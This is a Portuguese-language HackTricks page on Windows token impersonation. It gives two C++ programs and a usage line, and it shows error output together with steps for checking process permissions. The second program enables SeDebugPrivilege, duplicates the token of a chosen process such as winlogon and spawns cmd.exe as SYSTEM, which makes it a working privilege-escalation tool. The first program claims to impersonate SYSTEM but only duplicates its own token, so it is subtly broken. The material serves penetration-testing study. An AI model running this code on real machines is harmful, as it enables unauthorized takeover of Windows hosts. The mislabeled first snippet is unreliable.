<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


## Código

O seguinte código foi copiado [aqui](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962).
Ele permite **indicar um ID de processo como argumento** e um CMD **executado como o usuário** do processo indicado será executado.\
Executando em um processo de alta integridade, você pode **indicar o PID de um processo em execução como System** (como winlogon, wininit) e executar um cmd.exe como System.
```cpp
impersonateuser.exe 1234
```
{% code title="impersonateuser.cpp" %}
```cpp
#include <windows.h>
#include <stdio.h>

BOOL ImpersonateSystem()
{
    HANDLE hToken;
    BOOL result = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
    {
        HANDLE hSystemToken;

        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hSystemToken))
        {
            TOKEN_PRIVILEGES tokenPrivileges;
            tokenPrivileges.PrivilegeCount = 1;
            tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPrivileges.Privileges[0].Luid))
            {
                if (AdjustTokenPrivileges(hSystemToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
                {
                    if (ImpersonateLoggedOnUser(hSystemToken))
                    {
                        result = TRUE;
                    }
                }
            }

            CloseHandle(hSystemToken);
        }

        CloseHandle(hToken);
    }

    return result;
}

int main()
{
    if (ImpersonateSystem())
    {
        printf("Impersonated SYSTEM successfully!\n");

        // Do whatever you want as SYSTEM here

        RevertToSelf();
    }
    else
    {
        printf("Failed to impersonate SYSTEM!\n");
    }

    return 0;
}
```
{% endcode %}
```cpp
#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}
	return TRUE;
}
std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}
int main(int argc, char** argv) {
	// Print whoami to compare to thread later
	printf("[+] Current user is: %s\n", (get_username()).c_str());
	// Grab PID from command line argument
	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	// Call OpenProcess(), print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());
		printf("[+] Reverting thread to original user context\n");
		RevertToSelf();
	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}
	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}
	// Call CreateProcessWithTokenW(), print return code and error code
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
	if (GetLastError() == NULL)
		printf("[+] Process spawned!\n");
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}
	return 0;
}
```
{% endcode %}

## Erro

Em algumas ocasiões, você pode tentar se passar pelo System e não funcionará, mostrando uma saída como a seguinte:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Isso significa que mesmo que você esteja executando em um nível de Integridade Alta, você não tem permissões suficientes. 

Vamos verificar as permissões atuais do Administrador sobre os processos `svchost.exe` com o **processes explorer** (ou você também pode usar o process hacker):

1. Selecione um processo de `svchost.exe`
2. Clique com o botão direito --> Propriedades
3. Dentro da guia "Segurança", clique no botão "Permissões" no canto inferior direito
4. Clique em "Avançado"
5. Selecione "Administradores" e clique em "Editar"
6. Clique em "Mostrar permissões avançadas"

A imagem anterior contém todos os privilégios que "Administradores" têm sobre o processo selecionado (como você pode ver no caso de `svchost.exe`, eles só têm privilégios de "Consulta")

Veja os privilégios que "Administradores" têm sobre `winlogon.exe`:

Dentro desse processo, "Administradores" podem "Ler Memória" e "Ler Permissões", o que provavelmente permite que os Administradores se façam passar pelo token usado por esse processo.
